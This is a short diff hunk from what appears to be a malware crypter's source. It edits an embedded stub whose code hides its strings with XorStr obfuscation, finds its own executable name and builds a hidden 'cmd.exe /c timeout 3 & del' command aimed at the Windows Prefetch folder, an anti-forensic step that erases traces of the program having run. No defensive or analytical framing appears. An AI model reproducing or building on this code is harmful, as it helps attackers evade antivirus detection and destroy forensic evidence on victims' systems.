@@ -80,7 +80,7 @@ const char* CRYPTER_BASE_SOURCE =
 "GetModuleFileName(NULL, szExeFileName, MAX_PATH);\n"
 "string filepath = string(szExeFileName);\n"
 "string exe = filepath.substr(filepath.find_last_of(XorStr(\"\\\\\")) + 1, filepath.size());\n" 
-"CHAR cat[MAX_PATH] = \"\"; strcat(cat, XorStr(\"cmd.exe /c timeout 3 & del \\\"C:\\\\Windows\\\\Prefetch\\\\ \")); \n"
+"CHAR cat[MAX_PATH] = \"\"; strcat(cat, XorStr(\"cmd.exe /c timeout 3 & del \\\"C:\\\\Windows\\\\Prefetch\\\\\")); \n"
 "STARTUPINFOA startInf;\n"
 "memset(&startInf, 0, sizeof startInf);\n"
 "startInf.cb = sizeof(startInf);\n"
